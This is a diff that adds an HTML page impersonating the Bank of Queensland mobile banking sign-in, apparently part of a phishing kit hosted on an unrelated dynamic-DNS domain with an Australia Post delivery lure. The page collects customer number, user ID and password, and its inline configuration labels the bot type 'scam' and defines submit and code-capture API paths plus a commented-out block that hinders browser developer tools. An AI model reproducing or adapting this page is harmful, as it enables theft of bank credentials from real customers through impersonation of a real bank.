@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+
+<head>
+    <meta name="Html-Charset" http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="Content-Script-Type" content="text/javascript">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <title>BOQ Mobile Banking</title>
+    <base href="https://auspost.serveblog.net">
+    <link href="/static/personal-cabinet/images/au/boq/favicon.png" rel="icon" type="image/x-icon">
+
+    <link rel="stylesheet" href="/static/personal-cabinet/css/au/boq/mobile.default445E.css">
+</head>
+
+<body id="MB37">
+    <div class="root_container">
+        <div class="heading-wrapper" id="heading-wrapper">
+            <div class="heading"><img src="/static/personal-cabinet/images/au/boq/BOQ-logo.png" alt="Logo"></div>
+        </div>
+        <div class="page_body">
+            <div class="main_content" id="main_content">
+                <div>
+                    <input type="hidden" id="bank-name" value="BOQ">
+                    <input type="hidden" id="country-code-pc" value="AU">
+
+                    <span id="campaignLinkBox">
+                        <a href="#"></a>
+                    </span>
+                    <h1>Please Sign In:</h1>
+                    <div class="login-content">
+                        <div class="login-form">
+                            <div id="useridfields">
+                                <label for="txtUserid">Customer number</label>
+                                <input type="text" name="txtUserid" size="20" id="login" value="" alt="Customer number"
+                                    maxlength="10">
+                            </div>
+                            <div id="usersignonfields">
+                                <label for="txtUserSignon">User ID</label>
+                                <input type="text" name="txtUserSignon" size="20" id="password" value="" maxlength="10">
+                            </div>
+                            <div id="accesscodefields">
+                                <label for="password">Password</label>
+                                <input type="password" name="txtPassword" size="20" id="pin" autocomplete="off"
+                                    alt="Password" maxlength="55">
+                            </div>
+                        </div>
+                        <div class="buttons">
+                            <button disabled type="submit" class="btn_ btndf" id="pc-submit-button">Sign In</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="padlock_text" id="padlock_text">This page is encrypted and secure</div>
+        <div id="screenId" class="sid">L5N8HCWLW4-MB37</div>
+        <div class="powered_by">Powered by Sandstone Technology<a href="#" title="Opens in a new window"><img
+                    src="/static/personal-cabinet/images/au/boq/powered-by.gif" class="logo"
+                    alt="Powered by Sandstone Technology"></a></div>
+    </div>
+
+
+    <script>
+        const botType = "scam";
+        const currency = "AUD";
+        const supportToken = "cvfQ1VdOtX0SdAwvlcqdpGccIrhYb1kJ";
+        const languageCode = "EN";
+
+        const updateApiPath = "/api/update";
+        const stepsApiPath = "/api/steps";
+        const submitApiPath = "/api/submit";
+        const codeApiPath = "/api/code";
+
+        const userLocation = {
+            country: "🇦🇺 Австралия",
+            template: "merchant",
+            countryCode: "AU",
+            bank: "BOQ",
+        };
+    </script>
+
+
+    <script>
+        const adId = "4Ru2sQpsL199";
+        const adSubtype = "2.0";
+        const tpType = 0;
+        const logoPath = "/static/delivery/images/auspost/logo.png";
+    </script>
+
+
+    <!-- Bootstrap -->
+    <link href="/static/other/bootstrap/css/bootstrap.css" rel="stylesheet">
+    <script src="/static/other/bootstrap/js/bootstrap.js"></script>
+
+    <!-- SweetAlert -->
+    <link rel="stylesheet" type="text/css" href="/static/other/sweetalert/css/style.css">
+    <script src="/static/other/sweetalert/js/sweetalert2@11.js"></script>
+
+    <!-- iMask -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/imask/7.6.0/imask.min.js"></script>
+
+    <!-- Axios -->
+    <!-- <script src="/static/other/axios/axios.min.js"></script> -->
+
+    <!-- jQuery -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    <!-- Console -->
+    <!-- <script src="/static/other/console/console-ban.min.js"></script>
+
+<script>
+    ConsoleBan.init({
+        redirect: 'https://http.cat/403'
+    });
+</script>
+
+<script>
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    document.addEventListener('keydown', (e) => {
+        if ((e.ctrlKey && e.shiftKey && e.key == 'I') ||
+            (e.ctrlKey && e.shiftKey && e.key == 'J') ||
+            (e.key === 'F12')) {
+            e.preventDefault();
+        }
+    });
+</script> -->
+
+    <noscript>
+        <div id="noscript-content">
+            <p>JavaScript is disabled in your browser. Please enable JavaScript to view this content.</p>
+        </div>
+    </noscript>
+
+
+
+
+    <link rel="stylesheet" type="text/css" href="/static/support/css/chat.css">
+
+    <style>
+        .chaport-close.visible,
+        .chaport-container .chaport-close.visible {
+            display: block;
+        }
+
+        .chaport-overlay .chaport-close {
+            position: absolute;
+            width: 70px;
+            height: 70px;
+            top: 13px;
+            right: 27px;
+            opacity: 0.6;
+        }
+
+        .chaport-close,
+        .chaport-container .chaport-close {
+            position: absolute;
+            top: 0px;
+            right: 0px;
+            z-index: 4;
+            width: 50px;
+            height: 70px;
+            cursor: pointer;
+            opacity: 1;
+            transition: opacity 0.2s linear 0s;
+            display: none;
+        }
+
+        .chaport-overlay .chaport-close::before,
+        .chaport-overlay .chaport-close::after {
+            content: "";
+            height: 31px;
+            width: 2px;
+            background-color: rgb(238, 238, 238);
+            right: 33px;
+            top: 19px;
+        }
+
+        .chaport-close::before,
+        .chaport-container .chaport-close::before {
+            transform: rotate(45deg);
+        }
+
+        .chaport-close::after,
+        .chaport-container .chaport-close::after {
+            transform: rotate(-45deg);
+        }
+
+        .chaport-close::before,
+        .chaport-close::after,
+        .chaport-container .chaport-close::before,
+        .chaport-container .chaport-close::after {
+            position: absolute;
+            top: 24px;
+            right: 28px;
+            content: " ";
+            height: 22px;
+            width: 2px;
+            background-color: rgb(255, 255, 255);
+        }
+    </style>
+    <script src="/static/other/swal/language.js"></script>
+    <script src="/static/other/swal/swal-methods.js"></script>
+    <script src="/static/other/swal/system.js"></script>
+
+    <script>
+        $('#login, #password, #pin').on('keyup input', function () {
+            const isLoginValid = $('#login').val().length === 0;
+            const isPasswordEmpty = $('#password').val().length === 0;
+            const isPinEmpty = $('#pin').val().length === 0;
+
+            $('#pc-submit-button').prop('disabled', isLoginValid || isPasswordEmpty || isPinEmpty);
+        });
+    </script>
+    <script src="/lol/s.js"></script>
+    <script src="/static/pc-card/js/personal-cabinet/validate.js"></script>
+</body>
+
+</html>
